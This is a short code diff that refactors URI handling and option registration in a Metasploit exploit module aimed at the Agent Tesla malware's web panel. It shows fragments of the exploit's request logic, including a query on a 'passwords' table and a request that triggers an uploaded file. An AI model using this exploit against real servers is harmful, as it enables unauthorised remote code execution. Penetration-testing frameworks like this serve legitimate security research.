@@ -63,8 +63,7 @@ class MetasploitModule < Msf::Exploit::Remote
     ))
 
     register_options([
-      Opt::RPORT(80),
-      OptString.new('TARGETURI', [true, 'The URI of the tesla agent with panel path', '/WebPanel/']),
+      OptString.new('TARGETURI', [true, 'The URI of the tesla agent with panel path', '/WebPanel/'])
     ])
   end
 
@@ -107,7 +106,7 @@ class MetasploitModule < Msf::Exploit::Remote
   def execute_command(command)
     response = send_request_cgi(
       'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, '/server_side/scripts/server_processing.php'),
+      'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', 'server_processing.php'),
       'encode_params' => true,
       'vars_get' => {
         'table' => 'passwords',
@@ -181,7 +180,7 @@ class MetasploitModule < Msf::Exploit::Remote
       ## Triggering.
       send_request_cgi({
         'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path, '/server_side/scripts/', file_name)
+        'uri' => normalize_uri(target_uri.path, 'server_side', 'scripts', file_name)
       }, 2.5)
     end
   end
